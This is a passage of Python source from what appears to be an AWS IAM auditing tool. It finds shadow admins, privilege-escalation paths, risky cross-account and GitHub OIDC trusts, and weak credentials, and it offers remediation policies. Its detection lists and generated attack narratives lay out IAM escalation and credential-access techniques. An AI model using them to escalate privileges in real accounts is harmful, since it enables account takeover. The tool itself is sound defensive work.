        groups = []

        iam_actions = actions & IAM_CHECKS
        s3_actions = actions & S3_CHECKS
        cred_actions = actions & CRED_CHECKS
        compute_actions = actions & COMPUTE_CHECKS
        evasion_actions = actions & EVASION_CHECKS

        if iam_actions:
            if len(iam_actions) >= IAM_WILDCARD_THRESHOLD:
                groups.append(("iam:*", "critical", sorted(iam_actions)))
            else:
                groups.append(("IAM (specific)", "high", sorted(iam_actions)))

        if s3_actions:
            label = "s3:*" if s3_actions >= S3_CHECKS else "S3 (partial)"
            groups.append((label, "high", sorted(s3_actions)))

        if cred_actions:
            groups.append(("Credential Access", "high", sorted(cred_actions)))

        if compute_actions:
            groups.append(("Service Compute Abuse", "high", sorted(compute_actions)))

        if evasion_actions:
            groups.append(("Defense Evasion", "medium", sorted(evasion_actions)))

        return groups

    def _has_wildcard_resource_for_action(self, principal: Principal, action: str) -> bool:
        """Check if a principal has wildcard resource scope for a specific action.

        This is important for distinguishing between:
        - iam:CreateAccessKey on Resource: * (can create keys for any user - DANGEROUS)
        - iam:CreateAccessKey on Resource: arn:aws:iam::*:user/${aws:username} (self only - not escalation)

        Considers attached, inline, group-inherited, and resolved managed policies.
        """
        for policy, _source in self._effective_policies(principal):
            for stmt in policy.statements:
                if stmt.effect != "Allow":
                    continue

                action_matches = False
                if stmt.not_actions:
                    action_matches = action not in self._dangerous_covered_by_statement(
                        PolicyStatement(effect="Allow", actions=list(stmt.not_actions), resources=[])
                    ) and action not in stmt.not_actions
                else:
                    for stmt_action in stmt.actions:
                        if stmt_action == "*" or stmt_action == action:
                            action_matches = True
                            break
                        elif stmt_action.endswith(":*"):
                            service = stmt_action.split(":")[0]
                            if action.startswith(service + ":"):
                                action_matches = True
                                break

                if not action_matches:
                    continue

                if stmt.not_resources and not stmt.resources:
                    return True

                for resource in stmt.resources:
                    if resource == "*":
                        return True
                    if "${aws:username}" in resource or "${aws:userid}" in resource:
                        continue
                    if action.startswith("iam:"):
                        if resource.endswith("/*") or resource.endswith(":*"):
                            return True

        return False

    def _has_wildcard_passrole(self, principal: Principal) -> bool:
        """Check if a principal can pass ANY role (Resource: *)."""
        return self._has_wildcard_resource_for_action(principal, "iam:PassRole")

    def _find_shadow_admins(self) -> List[Principal]:
        """Find principals with admin-equivalent permissions but no AdministratorAccess.

        A true shadow admin is one who has DIRECT escalation capabilities:
        1. Can directly assume an admin role (1-hop sts:AssumeRole)
        2. Has IAM-modifying permissions (iam:AttachRolePolicy, iam:CreateAccessKey, etc.)
        3. Has iam:PassRole + compute permissions (can create Lambda/EC2/etc with admin role)

        NOT someone who is just in a multi-hop escalation path.
        """
        shadow = []

        direct_escalation_actions = {
            "iam:AttachUserPolicy", "iam:AttachRolePolicy", "iam:AttachGroupPolicy",
            "iam:PutUserPolicy", "iam:PutRolePolicy", "iam:PutGroupPolicy",
            "iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion",
            "iam:UpdateAssumeRolePolicy", "iam:AddUserToGroup",
        }

        passrole_combo_actions = {
            "lambda:CreateFunction", "lambda:UpdateFunctionCode",
            "ec2:RunInstances", "cloudformation:CreateStack",
            "codebuild:CreateProject", "glue:CreateJob",
            "sagemaker:CreateNotebookInstance", "ecs:RunTask",
        }

        for arn, principal in self.principals.items():
            if principal.is_admin:
                continue
            if self._is_aws_managed(principal.name):
                continue

            can_assume_admin = False
            for edge in self.edge_from.get(arn, []):
                if edge.target in self.admins and "AssumeRole" in edge.short_reason:
                    can_assume_admin = True
                    break

            if can_assume_admin:
                shadow.append(principal)
                continue

            has_direct_iam = False
            for iam_action in principal.dangerous_actions & direct_escalation_actions:
                if self._has_wildcard_resource_for_action(principal, iam_action):
                    has_direct_iam = True
                    break

            has_passrole = "iam:PassRole" in principal.dangerous_actions
            has_wildcard_passrole = has_passrole and self._has_wildcard_passrole(principal)
            has_compute = bool(principal.dangerous_actions & passrole_combo_actions)
            has_passrole_combo = has_wildcard_passrole and has_compute

            has_credential_theft = (
                "iam:CreateAccessKey" in principal.dangerous_actions and
                self._has_wildcard_resource_for_action(principal, "iam:CreateAccessKey")
            )

            if has_direct_iam or has_passrole_combo or has_credential_theft:
                shadow.append(principal)

        return shadow

    def _can_reach_admin(self, start_arn: str, visited: Set[str] = None) -> bool:
        """Check if principal can reach an admin through edges."""
        if visited is None:
            visited = set()

        if start_arn in visited:
            return False
        visited.add(start_arn)

        for edge in self.edge_from.get(start_arn, []):
            if edge.target in self.admins:
                return True
            if self._can_reach_admin(edge.target, visited):
                return True

        return False

    def _find_overly_permissive(self, exclude_arns: Optional[Set[str]] = None) -> List[Principal]:
        """Find principals with dangerous but non-admin permissions.

        Excludes admins, AWS-managed roles, and (per the finding's own description)
        principals already reported as shadow admins, so the same principal is not
        double-counted across findings. Applies resource scope analysis to reduce FPs.
        """
        exclude_arns = exclude_arns or set()
        overly = []

        for arn, principal in self.principals.items():
            if principal.is_admin:
                continue
            if arn in exclude_arns:
                continue
            if self._is_aws_managed(principal.name):
                continue

            risk_score = self._calculate_permission_risk(principal)
            if risk_score >= 5:
                overly.append((principal, risk_score))

        overly.sort(key=lambda x: -x[1])
        return [p for p, _ in overly]

    def _calculate_permission_risk(self, principal: Principal) -> int:
        """Calculate risk score for a principal's permissions.

        Considers:
        - Action type (IAM > compute > read)
        - Resource scope (* = high risk, specific = lower)
        - Condition presence (conditions = lower risk)
        """
        score = 0

        escalation_actions = {
            "iam:AttachUserPolicy", "iam:AttachRolePolicy", "iam:AttachGroupPolicy",
            "iam:PutUserPolicy", "iam:PutRolePolicy", "iam:PutGroupPolicy",
            "iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion",
            "iam:UpdateAssumeRolePolicy", "iam:AddUserToGroup", "iam:CreateAccessKey",
        }

        for policy_arn in principal.policies:
            policy = self.policies.get(policy_arn)
            if not policy:
                continue

            for stmt in policy.statements:
                if stmt.effect != "Allow":
                    continue

                is_wildcard_resource = any(r == "*" for r in stmt.resources)
                has_conditions = bool(stmt.conditions)

                for action in stmt.actions:
                    base_score = 0

                    if action == "*":
                        base_score = 10
                    elif action in escalation_actions:
                        base_score = 4
                    elif action in DANGEROUS_ACTIONS:
                        base_score = 2
                    elif action.endswith(":*"):
                        service = action.split(":")[0]
                        if service == "iam":
                            base_score = 5
                        elif service in ["sts", "secretsmanager", "ssm"]:
                            base_score = 3
                        elif service in ["s3", "ec2", "lambda"]:
                            base_score = 2

                    if not is_wildcard_resource and base_score > 0:
                        base_score = max(1, base_score - 1)

                    if has_conditions and base_score > 0:
                        base_score = max(1, base_score - 1)

                    score += base_score

        return score

    def _find_escalation_paths(self) -> List[EscalationPath]:
        """Find and analyze all privilege escalation paths."""
        paths = []

        for arn, principal in self.principals.items():
            if principal.is_admin:
                continue
            if self._is_aws_managed(principal.name):
                continue

            admin_paths = self._find_paths_to_admin(arn)
            for target_arn, hops in admin_paths:
                target = self.principals.get(target_arn)
                if not target:
                    continue

                technique = self._classify_technique(hops)
                path = EscalationPath(
                    source=principal,
                    target=target,
                    hops=hops,
                    technique=technique,
                )

                self._score_path(path)
                paths.append(path)

        return sorted(paths, key=lambda p: -p.risk_score)

    def _find_paths_to_admin(self, start_arn: str) -> List[Tuple[str, List[Edge]]]:
        """BFS to find all paths from start to any admin."""
        results = []
        queue = [(start_arn, [])]
        visited = {start_arn}

        while queue:
            current, path = queue.pop(0)

            for edge in self.edge_from.get(current, []):
                if edge.target in visited:
                    continue

                new_path = path + [edge]

                if edge.target in self.admins:
                    results.append((edge.target, new_path))
                elif len(new_path) < 5:
                    visited.add(edge.target)
                    queue.append((edge.target, new_path))

        return results

    def _classify_technique(self, hops: List[Edge]) -> str:
        """Classify escalation technique based on edge reasons."""
        if not hops:
            return "Unknown"

        combined_reason = " ".join(h.reason for h in hops)

        for technique, patterns in TECHNIQUE_PATTERNS.items():
            if any(re.search(p, combined_reason, re.I) for p in patterns):
                return technique

        return "Other"

    def _score_path(self, path: EscalationPath):
        """Calculate risk score for an escalation path."""
        hop_count = len(path.hops)
        if hop_count == 1:
            path.complexity = 10
        elif hop_count == 2:
            path.complexity = 8
        elif hop_count <= 4:
            path.complexity = 5
        else:
            path.complexity = 2

        path.exposure = 5
        if path.source.has_access_keys:
            path.exposure += 3
        if path.source.principal_type == "role":
            if path.source.trust_policy:
                trust_str = json.dumps(path.source.trust_policy)
                if '"*"' in trust_str or "arn:aws:iam::" in trust_str:
                    path.exposure += 2

        path.blast_radius = 10 if path.target.is_admin else 5

        weighted = (
            (path.complexity * 0.25) +
            (path.exposure * 0.35) +
            (path.blast_radius * 0.40)
        )
        path.risk_score = min(100, round(weighted * 10))

        if path.risk_score >= 80:
            path.severity = "critical"
        elif path.risk_score >= 60:
            path.severity = "high"
        elif path.risk_score >= 40:
            path.severity = "medium"
        else:
            path.severity = "low"

        path.mitre_techniques = get_mitre_for_technique(path.technique)

        path.attack_narrative = self._generate_attack_narrative(path)

    def _generate_attack_narrative(self, path: EscalationPath) -> str:
        """Generate a human-readable attack narrative for the escalation path."""
        source_type = path.source.principal_type
        source_name = path.source.name
        target_name = path.target.name

        if source_type == "user":
            narrative = f"An attacker who compromises the IAM user '{source_name}'"
            if path.source.has_access_keys:
                narrative += " (which has active access keys)"
        elif source_type == "role":
            narrative = f"An attacker who can assume the role '{source_name}'"
        else:
            narrative = f"An attacker with access to '{source_name}'"

        if len(path.hops) == 1:
            hop = path.hops[0]
            narrative += f" can directly escalate to '{target_name}' by exploiting: {hop.reason}."
        else:
            narrative += " can escalate through a multi-step attack chain:\n"
            for i, hop in enumerate(path.hops, 1):
                hop_target = hop.target.split("/")[-1] if "/" in hop.target else hop.target.split(":")[-1]
                narrative += f"  {i}. {hop.reason} -> {hop_target}\n"

        if path.target.is_admin:
            narrative += "\nThis results in full administrative access to the AWS account, "
            narrative += "allowing the attacker to access all resources, exfiltrate data, "
            narrative += "create backdoors, and disable security controls."

        return narrative

    @staticmethod
    def _external_id_enforced(conditions: Dict) -> bool:
        """True only if sts:ExternalId is bound to a concrete value under an equality
        operator. Presence of the key is NOT enforcement: StringLike with '*', a Null
        check, or StringNotEquals do not constrain who can assume the role."""
        if not isinstance(conditions, dict):
            return False
        for op, kv in conditions.items():
            if not isinstance(kv, dict):
                continue
            op_l = op.lower()
            for k, v in kv.items():
                if k.lower() != "sts:externalid":
                    continue
                vals = v if isinstance(v, list) else [v]
                if "equals" in op_l and "notequals" not in op_l:
                    if all(isinstance(x, str) and x and "*" not in x and "?" not in x for x in vals):
                        return True
        return False

    def _analyze_cross_account_trusts(self) -> List[CrossAccountTrust]:
        """Analyze role trust policies for external assumability.

        Handles AWS, Federated (SAML/OIDC, e.g. GitHub Actions) and Service principals;
        verifies that ExternalId is actually ENFORCED (not merely present); and escalates
        risk when the trusted-into role is itself admin/privileged.
        """
        trusts = []

        for arn, principal in self.principals.items():
            if principal.principal_type != "role":
                continue
            if not principal.trust_policy:
                continue

            trust_doc = principal.trust_policy
            if isinstance(trust_doc, str):
                try:
                    trust_doc = json.loads(trust_doc)
                except Exception:
                    continue

            target_is_admin = principal.is_admin or bool(principal.dangerous_actions)

            statements = trust_doc.get("Statement", [])
            if isinstance(statements, dict):
                statements = [statements]
            for stmt in statements:
                if stmt.get("Effect") != "Allow":
                    continue

                principals_field = stmt.get("Principal", {})
                if isinstance(principals_field, str):
                    principals_field = {"AWS": [principals_field]}
                if principals_field == "*":
                    principals_field = {"AWS": ["*"]}

                conditions = stmt.get("Condition", {})
                condition_str = json.dumps(conditions).lower()
                has_external_id = "sts:externalid" in condition_str
                external_id_enforced = self._external_id_enforced(conditions)
                has_source = ("aws:sourcearn" in condition_str) or ("aws:sourceaccount" in condition_str)
                has_org_id = "aws:principalorgid" in condition_str
                has_principal_arn = "aws:principalarn" in condition_str
                has_mfa = "aws:multifactorauthpresent" in condition_str
                has_sub_aud = any(x in condition_str for x in (":sub", ":aud", "saml:aud", ":oaud"))

                aws_principals = principals_field.get("AWS", [])
                if isinstance(aws_principals, str):
                    aws_principals = [aws_principals]
                for trusted in aws_principals:
                    is_wildcard = trusted == "*"
                    trusted_account = ""
                    if not is_wildcard:
                        if "arn:aws:iam::" in trusted or "arn:aws:sts::" in trusted:
                            parts = trusted.split(":")
                            if len(parts) > 4:
                                trusted_account = parts[4]
                        elif trusted.isdigit() and len(trusted) == 12:
                            trusted_account = trusted
                    if trusted_account and trusted_account == self.account_id and not is_wildcard:
                        continue

                    if is_wildcard:
                        if not conditions:
                            risk, reason = "critical", "Principal:* with no conditions (any AWS account can assume)"
                        elif has_org_id or has_principal_arn:
                            risk, reason = "medium", "Wildcard principal constrained by org/principal condition"
                        elif external_id_enforced or has_mfa:
                            risk, reason = "high", "Wildcard principal with only ExternalId/MFA (guessable/insufficient)"
                        else:
                            risk, reason = "high", "Wildcard principal with weak/non-enforcing conditions"
                    else:
                        if external_id_enforced or has_mfa or has_org_id or has_principal_arn:
                            risk, reason = "low", "Specific external principal with an enforced protective condition"
                        elif has_external_id and not external_id_enforced:
                            risk, reason = "medium", "ExternalId present but NOT enforced (wildcard/Null/NotEquals) - confused-deputy risk"
                        else:
                            risk, reason = "medium", "Specific external principal, no ExternalId - confused-deputy risk"

                    if target_is_admin and risk in ("medium", "high"):
                        risk = "critical" if risk == "high" or is_wildcard else "high"
                        reason += "; trusted-into role is ADMIN/privileged"

                    trusts.append(CrossAccountTrust(
                        role_arn=arn, role_name=principal.name,
                        trusted_principal=trusted,
                        trusted_account=trusted_account or ("*" if is_wildcard else "unknown"),
                        has_external_id=has_external_id, has_conditions=bool(conditions),
                        is_wildcard=is_wildcard, risk_level=risk,
                        principal_kind="AWS", external_id_enforced=external_id_enforced,
                        target_is_admin=target_is_admin, reason=reason,
                        remediation_key="cross_account_wildcard" if is_wildcard else
                                        ("cross_account_no_external_id" if not external_id_enforced else ""),
                    ))

                fed_principals = principals_field.get("Federated", [])
                if isinstance(fed_principals, str):
                    fed_principals = [fed_principals]
                for fed in fed_principals:
                    fed_l = str(fed).lower()
                    is_oidc = fed_l.startswith("arn:aws:iam::") and ":oidc-provider/" in fed_l
                    is_github = "token.actions.githubusercontent.com" in fed_l
                    is_saml = ":saml-provider/" in fed_l
                    if is_github:
                        if not has_sub_aud:
                            risk = "critical"
                            reason = "GitHub Actions OIDC trust with NO sub/aud constraint - ANY GitHub repo can assume this role"
                        elif ("*" in condition_str) or (":sub" not in condition_str):
                            risk = "high"
                            reason = "GitHub Actions OIDC trust with a wildcard/under-constrained sub (branch/repo scoping too broad)"
                        else:
                            risk = "low"
                            reason = "GitHub Actions OIDC trust scoped to a specific repo/branch via sub"
                    elif is_oidc:
                        risk = "high" if not has_sub_aud else "low"
                        reason = ("OIDC federated trust without sub/aud constraint" if not has_sub_aud
                                  else "OIDC federated trust constrained by sub/aud")
                    elif is_saml:
                        risk = "medium" if "saml:aud" not in condition_str else "low"
                        reason = ("SAML federated trust (verify IdP and saml:aud)" if risk != "low"
                                  else "SAML federated trust with audience restriction")
                    else:
                        risk, reason = "medium", "Federated trust to an external identity provider"
                    if target_is_admin and risk in ("medium", "high"):
                        risk = "critical" if risk == "high" else "high"
                        reason += "; trusted-into role is ADMIN/privileged"
                    trusts.append(CrossAccountTrust(
                        role_arn=arn, role_name=principal.name,
                        trusted_principal=str(fed),
                        trusted_account="federated",
                        has_external_id=False, has_conditions=bool(conditions),
                        is_wildcard=False, risk_level=risk,
                        principal_kind="Federated", external_id_enforced=False,
                        target_is_admin=target_is_admin, reason=reason,
                        remediation_key="federated_oidc",
                    ))

                svc_principals = principals_field.get("Service", [])
                if isinstance(svc_principals, str):
                    svc_principals = [svc_principals]
                for svc in svc_principals:
                    svc_prefix = str(svc).split(".")[0].lower()
                    if svc_prefix not in CONFUSED_DEPUTY_SERVICES:
                        continue
                    if has_source or has_org_id:
                        continue
                    risk = "high" if target_is_admin else "medium"
                    trusts.append(CrossAccountTrust(
                        role_arn=arn, role_name=principal.name,
                        trusted_principal=str(svc),
                        trusted_account="service",
                        has_external_id=False, has_conditions=bool(conditions),
                        is_wildcard=False, risk_level=risk,
                        principal_kind="Service", external_id_enforced=False,
                        target_is_admin=target_is_admin,
                        reason=f"Service trust ({svc}) can act on behalf of other resources but is missing aws:SourceArn/aws:SourceAccount - cross-service confused-deputy risk",
                        remediation_key="service_confused_deputy",
                    ))

        return sorted(trusts, key=lambda t:
            {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(t.risk_level, 4))

    _EVIDENCE_PRIORITY = [
        "*", "iam:*", "iam:AttachUserPolicy", "iam:AttachRolePolicy", "iam:PutUserPolicy",
        "iam:PutRolePolicy", "iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion",
        "iam:UpdateAssumeRolePolicy", "iam:CreateAccessKey", "iam:AddUserToGroup",
        "iam:PassRole", "sts:AssumeRole", "lambda:CreateFunction", "lambda:UpdateFunctionCode",
        "ec2:RunInstances", "cloudformation:CreateStack", "codebuild:CreateProject",
        "secretsmanager:GetSecretValue", "ssm:GetParameter",
    ]

    def _principal_evidence(self, p: Principal, limit: int = 6) -> List[Dict]:
        """Concrete per-principal evidence: which policy/statement grants each dangerous
        action. This is what a report needs ('what exactly is the issue')."""
        ev = getattr(p, "action_evidence", {}) or {}
        ordered = [a for a in self._EVIDENCE_PRIORITY if a in ev]
        ordered += [a for a in sorted(ev) if a not in ordered]
        out = []
        for a in ordered[:limit]:
            e = ev[a]
            out.append({
                "action": a,
                "policy": e.get("policy", ""),
                "policy_name": e.get("policy_name", ""),
                "source": e.get("source", "attached"),
                "sid": e.get("sid", ""),
                "resources": e.get("resources", ["*"]),
                "conditional": e.get("conditions", False),
            })
        return out

    def _generate_findings(self, analysis: AccountAnalysis) -> List[Finding]:
        """Generate structured findings from analysis results."""
        findings = []

        explicit_admins = [p for arn, p in self.principals.items()
                         if p.is_admin and not self._is_aws_managed(p.name)]
        total_admins = len(self.admins)
        managed_admin_count = total_admins - len(explicit_admins)
        if explicit_admins:
            findings.append(Finding(
                id=f"{self.account_id}_admin_access",
                title="Principals with Administrator Access",
                severity="critical",
                category="iam",
                description=(f"These {len(explicit_admins)} principals have full administrative access to all AWS "
                            f"services. (The account has {total_admins} administrative principals in total; the "
                            f"other {managed_admin_count} are AWS-managed/service roles reported separately below.)"),
                principals=[p.arn for p in explicit_admins],
                impact="Compromise of any of these credentials results in full account takeover.",
                remediation="Review each admin principal. Replace AdministratorAccess with AWS managed job-function policies (PowerUserAccess, SystemAdministrator, etc.). "
                           "Use IAM Access Analyzer to generate least-privilege policies based on actual access patterns. Enable MFA for all admin accounts. "
                           "Consider using AWS IAM Identity Center for centralized access management.",
                details={
                    "principals_detail": [
                        {"arn": p.arn, "name": p.name, "type": p.principal_type}
                        for p in explicit_admins
                    ]
                },
            ))

        if analysis.aws_managed_admins:
            findings.append(Finding(
                id=f"{self.account_id}_aws_managed_admin",
                title="Default AWS Managed Roles",
                severity="medium",
                category="iam",
                description="These AWS-managed roles were identified as administrative principals. "
                           "They are created by AWS services such as Control Tower, StackSets, and SSO. "
                           "While expected to be privileged, verify access is appropriately restricted.",
                principals=[p.arn for p in analysis.aws_managed_admins],
                impact="AWS managed roles carry elevated permissions by design. Review trust policies "
                      "to confirm access is restricted to authorized principals only.",
                remediation="Verify trust policies restrict access to legitimate principals. Use IAM Access Analyzer to identify external access. "
                           "Consider using SCPs to limit actions even for managed roles.",
                details={
                    "principals_detail": [
                        {"arn": p.arn, "name": p.name, "managed": True}
                        for p in analysis.aws_managed_admins
                    ]
                },
            ))

        if analysis.shadow_admins:
            shadow_details = []
            for p in analysis.shadow_admins:
                dangerous_actions = sorted(p.dangerous_actions)[:20] if p.dangerous_actions else []
                shadow_details.append({
                    "arn": p.arn,
                    "name": p.name,
                    "id_value": p.id_value,
                    "policies": p.policies[:10],
                    "dangerous_actions": dangerous_actions,
                    "capabilities": p.capabilities[:10],
                    "evidence": self._principal_evidence(p),
                    "boundary_capped": p.boundary_capped,
                    "has_notaction": p.has_notaction,
                    "unresolved_managed": p.unresolved_managed,
                    "capability_groups": [
                        {"group": g[0], "severity": g[1], "count": len(g[2])}
                        for g in p.capability_groups
                    ],
                })

            findings.append(Finding(
                id=f"{self.account_id}_shadow_admin",
                title="Shadow Administrators",
                severity="critical",
                category="iam",
                description="These principals can escalate to admin privileges without having "
                           "AdministratorAccess policy attached, making them invisible to standard IAM audits.",
                principals=[p.arn for p in analysis.shadow_admins],
                impact="Hidden administrative access that bypasses standard security reviews.",
                remediation="Remove excessive permissions that enable privilege escalation. "
                           "Implement IAM permissions boundaries to cap maximum permissions. "
                           "Use AWS Organizations SCPs/RCPs for organization-wide guardrails. "
                           "Review with IAM Access Analyzer policy validation.",
                details={"principals_detail": shadow_details},
            ))

        if analysis.overly_permissive:
            op_details = []
            for p in analysis.overly_permissive[:20]:
                has_critical = any(g[1] == "critical" for g in p.capability_groups)
                has_high = any(g[1] == "high" for g in p.capability_groups)
                sev = "critical" if has_critical else "high" if has_high else "medium"

                dangerous_actions = sorted(p.dangerous_actions)[:20] if p.dangerous_actions else []
                op_details.append({
                    "arn": p.arn,
                    "name": p.name,
                    "type": p.principal_type,
                    "id_value": p.id_value,
                    "severity": sev,
                    "policies": p.policies[:10],
                    "dangerous_actions": dangerous_actions,
                    "capabilities": p.capabilities[:8],
                    "evidence": self._principal_evidence(p),
                    "boundary_capped": p.boundary_capped,
                    "has_notaction": p.has_notaction,
                    "unresolved_managed": p.unresolved_managed,
                    "capability_groups": [
                        {"group": g[0], "severity": g[1], "actions": g[2][:5]}
                        for g in p.capability_groups
                    ],
                })

            findings.append(Finding(
                id=f"{self.account_id}_overly_permissive",
                title="Overly Permissive IAM Principals",
                severity="high",
                category="iam",
                description="These principals have permissions significantly broader than required, "
                           "excluding those already reported as administrators or shadow admins.",
                principals=[p.arn for p in analysis.overly_permissive[:20]],
                impact="Increased blast radius in case of credential compromise. "
                      "Each principal has dangerous capabilities listed below.",
                remediation="Apply least-privilege principles per AWS best practices. Use IAM Access Analyzer to "
                           "validate policies and generate least-privilege policies based on access activity. "
                           "Use last accessed information to identify unused permissions. "
                           "Implement permissions boundaries for delegated administration.",
                details={
                    "total_count": len(analysis.overly_permissive),
                    "principals_detail": op_details,
                },
            ))

        risky_trusts = [t for t in analysis.cross_account_trusts
                       if t.risk_level in ("critical", "high")]
        if risky_trusts:
            kinds = sorted(set(t.principal_kind for t in risky_trusts))
            findings.append(Finding(
                id=f"{self.account_id}_cross_account_trust",
                title="Risky Trust Relationships (Cross-Account / Federated / Service)",
                severity="critical" if any(t.risk_level == "critical" for t in risky_trusts) else "high",
                category="trust",
                description="These role trust policies allow assumption from external or under-constrained "
                           "principals: cross-account AWS principals, federated identity providers "
                           "(SAML/OIDC, e.g. GitHub Actions), or AWS services without SourceArn/SourceAccount. "
                           f"Trust kinds present: {', '.join(kinds)}.",
                principals=[t.role_arn for t in risky_trusts],
                impact="External or under-constrained principals may assume these roles. Where the role is "
                      "itself admin/privileged, this is a direct external path to account compromise.",
                remediation="AWS principals: replace Principal:'*' with specific ARNs and add an ENFORCED "
                           "sts:ExternalId (StringEquals with a secret value) or aws:PrincipalOrgID. "
                           "Federated/OIDC: constrain the sub/aud (for GitHub Actions pin repo:ORG/REPO:ref:...). "
                           "Service trusts: add aws:SourceArn/aws:SourceAccount to prevent confused-deputy abuse.",
                details={"trusts": [asdict(t) for t in risky_trusts]},
            ))

        if analysis.credential_hygiene:
            worst = "high" if any(c["severity"] == "high" for c in analysis.credential_hygiene) else \
                    "medium" if any(c["severity"] == "medium" for c in analysis.credential_hygiene) else "low"
            findings.append(Finding(
                id=f"{self.account_id}_credential_hygiene",
                title="IAM Credential Hygiene (MFA / Access Keys)",
                severity=worst,
                category="credential_hygiene",
                description="IAM users with weak credential hygiene: console access without MFA and/or "
                           "long-lived access keys. These are the most common root causes of real cloud "
                           "account compromise and are core CIS AWS Foundations checks.",
                principals=[c["arn"] for c in analysis.credential_hygiene],
                impact="A phished password without MFA, or a leaked static access key, grants an attacker the "
                      "user's full permission set. Privileged users without MFA are the highest priority.",
                remediation="Enforce MFA for all IAM users with console access (SCP/permission-boundary deny "
                           "when aws:MultiFactorAuthPresent is false). Replace long-term access keys with "
                           "short-lived credentials (IAM Identity Center / roles); rotate or delete unused keys.",
                details={"issues": analysis.credential_hygiene},
            ))

        critical_paths = [p for p in analysis.escalation_paths if p.severity == "critical"]
        if critical_paths:
            findings.append(Finding(
                id=f"{self.account_id}_privesc_critical",
                title="Critical Privilege Escalation Paths",
                severity="critical",
                category="privesc",
                description=f"Found {len(critical_paths)} paths where non-admin principals can "
                           "escalate to full administrative access.",
                principals=sorted(set(p.source.arn for p in critical_paths[:20])),
                impact="Attackers with access to these principals can gain full account control.",
                remediation="Remove or restrict permissions that enable escalation. Use permissions boundaries to limit maximum permissions. "
                           "Common fixes include: restricting iam:PassRole to specific roles, "
                           "adding resource conditions to sts:AssumeRole, limiting ec2:RunInstances.",
                details={
                    "path_count": len(critical_paths),
                    "techniques": sorted(set(p.technique for p in critical_paths)),
                },
            ))

        return findings

    def _is_aws_managed(self, name: str) -> bool:
        """Check if name matches AWS-managed resource patterns."""
        return any(re.search(p, name) for p in AWS_MANAGED_PATTERNS)


class RemediationEngine:
    """Generate specific remediation suggestions."""

    REMEDIATIONS = {
        "iam:PassRole": {
            "issue": "Unrestricted iam:PassRole allows passing any role to services",
            "fix": "Restrict Resource to specific role ARNs that the principal legitimately needs to pass",
            "example": '''{
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT:role/specific-role-name",
    "Condition": {
        "StringEquals": {
            "iam:PassedToService": "ec2.amazonaws.com"
        }
    }
}''',
        },
        "sts:AssumeRole": {
            "issue": "Unrestricted sts:AssumeRole allows assuming any role",
            "fix": "Restrict Resource to specific role ARNs that need to be assumed",
            "example": '''{
    "Effect": "Allow",
    "Action": "sts:AssumeRole",
    "Resource": [
        "arn:aws:iam::ACCOUNT:role/allowed-role-1",
        "arn:aws:iam::ACCOUNT:role/allowed-role-2"
    ]
}''',
        },
        "cross_account_no_external_id": {
            "issue": "Cross-account trust without ExternalId is vulnerable to confused deputy attacks",
            "fix": "Add sts:ExternalId condition to the trust policy",
            "example": '''{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::TRUSTED_ACCOUNT:root"},
    "Action": "sts:AssumeRole",
    "Condition": {
        "StringEquals": {
            "sts:ExternalId": "UNIQUE_SECRET_ID"
        }
    }
}''',
        },
        "cross_account_wildcard": {
            "issue": "Trust policy with Principal: '*' allows any AWS account to attempt role assumption",
            "fix": "Replace wildcard with specific account/principal ARNs",
            "example": '''{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::SPECIFIC_ACCOUNT:role/specific-role"},
    "Action": "sts:AssumeRole",
    "Condition": {
        "StringEquals": {
            "sts:ExternalId": "UNIQUE_ID"
        }
    }
}''',
        },
        "lambda_abuse": {
            "issue": "Lambda function permissions allow code injection via role assumption",
            "fix": "Restrict lambda:UpdateFunctionCode and lambda:CreateFunction to specific functions",
            "example": '''{
    "Effect": "Allow",
    "Action": ["lambda:UpdateFunctionCode"],
    "Resource": "arn:aws:lambda:REGION:ACCOUNT:function:specific-function-name"
}''',
        },
        "ec2_instance_profile": {
            "issue": "ec2:RunInstances with iam:PassRole enables launching instances with privileged roles",
            "fix": "Restrict PassRole to specific instance profile roles and limit RunInstances",
            "example": '''{
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT:role/ec2-limited-role",
    "Condition": {
        "StringEquals": {
            "iam:PassedToService": "ec2.amazonaws.com"
        }
    }
}''',
        },
        "admin_access": {
            "issue": "AdministratorAccess policy grants unrestricted access to all AWS services",
            "fix": "Replace with least-privilege policies specific to job function. Use IAM Access Analyzer to generate policies based on actual access patterns.",
            "example": '''# Use IAM Access Analyzer to generate least-privilege policies:
aws iam generate-service-last-accessed-details --arn <PRINCIPAL_ARN>
aws accessanalyzer start-policy-generation --policy-generation-details '{"principalArn":"<PRINCIPAL_ARN>"}'

# Use AWS managed job-function policies:
# - ViewOnlyAccess, PowerUserAccess, SystemAdministrator, DatabaseAdministrator
# - Create custom policies using Access Analyzer recommendations''',
        },
        "permissions_boundary": {
            "issue": "No permissions boundary limits the maximum permissions for delegated principals",
            "fix": "Attach a permissions boundary to limit maximum permissions delegated administrators can grant",
            "example": '''{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": ["s3:*", "cloudwatch:*", "ec2:*"],
            "Resource": "*"
        },
        {
            "Effect": "Deny",
            "Action": ["iam:*", "organizations:*"],
            "Resource": "*"
        }
    ]
}''',
        },
        "service_confused_deputy": {
            "issue": "Service trust policy missing aws:SourceArn/aws:SourceAccount conditions",
            "fix": "Add aws:SourceArn or aws:SourceAccount conditions to prevent cross-service confused deputy attacks",
            "example": '''{
    "Effect": "Allow",
    "Principal": {"Service": "lambda.amazonaws.com"},
    "Action": "sts:AssumeRole",
    "Condition": {
        "StringEquals": {
            "aws:SourceAccount": "123456789012"
        },
        "ArnLike": {
            "aws:SourceArn": "arn:aws:lambda:us-east-1:123456789012:function:*"
        }
    }
}''',
        },
        "federated_oidc": {
            "issue": "Federated (OIDC/SAML) trust without a subject/audience constraint lets any identity from the provider assume the role (e.g. any GitHub repo/branch, any user in the IdP)",
            "fix": "Constrain the OIDC/SAML condition to the exact subject(s): for GitHub Actions pin token.actions.githubusercontent.com:sub to repo:ORG/REPO:ref:refs/heads/BRANCH (and :aud to sts.amazonaws.com). Never leave the sub as a wildcard.",
            "example": '''{
    "Effect": "Allow",
